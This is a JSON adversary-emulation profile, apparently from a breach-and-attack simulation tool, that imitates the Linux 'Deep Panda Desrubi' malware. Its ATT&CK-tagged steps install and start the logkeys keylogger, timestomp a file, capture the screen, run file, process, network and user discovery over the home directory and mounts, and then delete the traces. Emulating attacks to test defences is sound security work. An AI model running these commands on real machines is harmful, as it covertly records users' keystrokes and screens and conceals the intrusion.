{
    "threat": {
        "category": "User-Defined",
        "description": "Linux Variant of Desrubi",
        "display_name": "Deep Panda Desrubi",
        "name": "Deep Panda Desrubi",
        "operating_system_name": "linux",
        "script": {
            "0": {
                "conf": {
                    "--cp": "127.0.0.1:443",
                    "--multipart": 10240,
                    "--secure": true
                },
                "module": "https",
                "type": "initialization"
            },
            "1": {
                "module": "loader",
                "module_to_load": "run",
                "request": "--load run",
                "type": "message"
            },
            "2": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "apt-get install logkeys",
                "type": "message"
            },
            "3": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "touch /tmp/log.txt",
                "type": "message"
            },
            "4": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "logkeys --start --output /tmp/log.txt",
                "rtags": [
                    "att&ck-technique:T1056"
                ],
                "type": "message"
            },
            "5": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "touch -a -t 197001010000.00 /tmp/timestomp",
                "rtags": [
                    "att&ck-technique:T1099"
                ],
                "type": "message"
            },
            "6": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "touch -m -t 197001010000.00 /tmp/timestomp",
                "rtags": [
                    "att&ck-technique:T1099"
                ],
                "type": "message"
            },
            "7": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "import -window root /tmp/shot.png",
                "rtags": [
                    "att&ck-technique:T1113"
                ],
                "type": "message"
            },
            "8": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "uname -a",
                "rtags": [
                    "att&ck-technique:T1082"
                ],
                "type": "message"
            },
            "9": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "cat /etc/lsb-release",
                "rtags": [
                    "att&ck-technique:T1082"
                ],
                "type": "message"
            },
            "10": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "uptime",
                "rtags": [
                    "att&ck-technique:T1082"
                ],
                "type": "message"
            },
            "11": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > /tmp/T1083.txt",
                "rtags": [
                    "atomic",
                    "att&ck",
                    "att&ck-tactic:TA0007",
                    "att&ck-technique:T1083"
                ],
                "type": "message"
            },
            "12": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "if [ -f /etc/mtab ]; then cat /etc/mtab >> /tmp/T1083.txt; fi;",
                "rtags": [
                    "atomic",
                    "att&ck",
                    "att&ck-tactic:TA0007",
                    "att&ck-technique:T1083"
                ],
                "type": "message"
            },
            "13": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "find . -type f -iname *.pdf >> /tmp/T1083.txt",
                "rtags": [
                    "atomic",
                    "att&ck",
                    "att&ck-tactic:TA0007",
                    "att&ck-technique:T1083"
                ],
                "type": "message"
            },
            "14": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "find . -type f -name \".*\"",
                "rtags": [
                    "atomic",
                    "att&ck",
                    "att&ck-tactic:TA0007",
                    "att&ck-technique:T1083"
                ],
                "type": "message"
            },
            "15": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "which sh",
                "rtags": [
                    "att&ck-technique:T1083"
                ],
                "type": "message"
            },
            "16": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "locate *",
                "rtags": [
                    "att&ck-technique:T1083"
                ],
                "type": "message"
            },
            "17": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "ps aux | less",
                "rtags": [
                    "att&ck-technique:T1057"
                ],
                "type": "message"
            },
            "18": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "netstat -tulpn",
                "rtags": [
                    "att&ck-technique:T1057"
                ],
                "type": "message"
            },
            "19": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "users",
                "rtags": [
                    "atomic",
                    "att&ck",
                    "att&ck-tactic:TA0007",
                    "att&ck-technique:T1033"
                ],
                "type": "message"
            },
            "20": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "w",
                "rtags": [
                    "atomic",
                    "att&ck",
                    "att&ck-tactic:TA0007",
                    "att&ck-technique:T1033"
                ],
                "type": "message"
            },
            "21": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "who",
                "rtags": [
                    "atomic",
                    "att&ck",
                    "att&ck-tactic:TA0007",
                    "att&ck-technique:T1033"
                ],
                "type": "message"
            },
            "22": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "rm -f /tmp/log.txt",
                "rtags": [
                    "att&ck-technique:T1070"
                ],
                "type": "message"
            },
            "23": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "rm -f /tmp/timestomp",
                "type": "message"
            },
            "24": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "rm -f /tmp/shot.png",
                "type": "message"
            },
            "25": {
                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                "module": "run",
                "request": "rm -f /tmp/T1083.txt",
                "type": "message"
            }
        },
        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29"
    }
}
